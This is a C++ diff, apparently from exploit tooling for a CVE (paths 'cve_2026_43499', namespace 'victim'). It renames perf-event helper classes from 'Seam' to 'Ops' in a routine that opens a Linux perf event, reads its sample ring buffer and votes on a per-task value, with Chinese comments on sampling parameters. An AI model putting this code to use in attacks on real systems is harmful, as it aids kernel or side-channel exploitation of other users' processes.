@@ -27,8 +27,8 @@
 #include <sys/wait.h>
 
 #include "backend/cve_2026_43499/perf_ring.hpp"
-#include "backend/cve_2026_43499/perf_seam_linux.hpp"
-#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
+#include "backend/cve_2026_43499/perf_ops_linux.hpp"
+#include "backend/cve_2026_43499/memory/heap_ops_linux.hpp"
 #include "backend/cve_2026_43499/perf_vote.hpp"
 
 namespace ghostlock::backend::victim {
@@ -37,7 +37,7 @@ namespace ghostlock::backend::victim {
         
         
 
-        /* 采样参数照**探针的真值**（tools/perf_seam_probe.cpp:46-48）与退役 primitives.cpp:68 一致：
+        /* 采样参数照**探针的真值**（tools/perf_ops_probe.cpp:46-48）与退役 primitives.cpp:68 一致：
          *  period=5000、自旋 500000 轮。此前我按 1/2000 填，采样量差两个数量级 ⇒ 投票必然不稳。 */
         inline constexpr std::uint64_t kSamplePeriod = 5000U;
         /* 环长度必须形如 (1 + 2^n) 页（perf 的硬性要求）；探针用 kPages*kPageBytes ✓，照抄。 */
@@ -68,32 +68,32 @@ namespace ghostlock::backend::victim {
             args.exclude_user = false;
             args.exclude_hv = true;
             args.exclude_idle = true;
-            const pf::SeamResult opened = pf::LinuxPerfSeam::perf_open(args);
+            const pf::OpsResult opened = pf::LinuxPerfOps::perf_open(args);
             std::printf(" PFOPEN fd=%lld errno=%d", static_cast<long long>(opened.value), opened.error);
             if (opened.value < 0) {
                 return 0U;
             }
             const auto fd = static_cast<std::int32_t>(opened.value);
-            auto *base = static_cast<unsigned char *>(pf::LinuxPerfSeam::perf_map(fd, kMapBytes));
+            auto *base = static_cast<unsigned char *>(pf::LinuxPerfOps::perf_map(fd, kMapBytes));
             std::printf(" PFMAP %s", base != nullptr ? "ok" : "null");
             if (base == nullptr) {
-                (void) pf::memory::LinuxHeapSeam::close_fd(fd);
+                (void) pf::memory::LinuxHeapOps::close_fd(fd);
                 return 0U;
             }
             const std::uint64_t data_offset = read_word(base, pf::kPerfDataOffsetOffset);
             const std::uint64_t data_size = read_word(base, pf::kPerfDataSizeOffset);
-            (void) pf::LinuxPerfSeam::perf_ioctl(fd, pf::kPerfEventIocEnable);
+            (void) pf::LinuxPerfOps::perf_ioctl(fd, pf::kPerfEventIocEnable);
             for (std::size_t i = 0U; i < kSpinRounds; ++i) {
-                (void) pf::LinuxPerfSeam::spin_once();
+                (void) pf::LinuxPerfOps::spin_once();
             }
-            (void) pf::LinuxPerfSeam::perf_ioctl(fd, pf::kPerfEventIocDisable);
+            (void) pf::LinuxPerfOps::perf_ioctl(fd, pf::kPerfEventIocDisable);
             /* perf 事件 ABI：data_head/data_tail 就排在两个指针之后 ✓（探针同形 ✓）。 */
             const std::uint64_t head = read_word(base, pf::kPerfDataHeadOffset);
             std::printf(" PFHEAD %llu", static_cast<unsigned long long>(head));
             pf::RingView ring{};
             /* 探针同形：走查的缓冲从 base + data_offset 起（我先前写成 base ⇒ 一个样本都读不到）。 */
             ring.buffer = base + data_offset;
-            /* 探针同形（perf_seam_probe.cpp:109）：头里的 data_size 为 0 时按 8 页算，否则走查会读到 0 个样本。 */
+            /* 探针同形（perf_ops_probe.cpp:109）：头里的 data_size 为 0 时按 8 页算，否则走查会读到 0 个样本。 */
             ring.data_size = static_cast<std::size_t>(data_size == 0U ? kPageBytes * 8U : data_size);
             ring.head = head;
             ring.tail = 0U;   /* 探针同形：tail 由调用方持有，这里不动 ✓ */
@@ -103,7 +103,7 @@ namespace ghostlock::backend::victim {
             std::printf(" PFSAMPLES %zu kept=%zu", outcome.samples, outcome.kept);
             const std::uint64_t voted = pf::vote_for_task(values, outcome.kept);
             static_cast<void>(::munmap(base, kMapBytes));
-            (void) pf::memory::LinuxHeapSeam::close_fd(fd);
+            (void) pf::memory::LinuxHeapOps::close_fd(fd);
             return voted;
         }
 
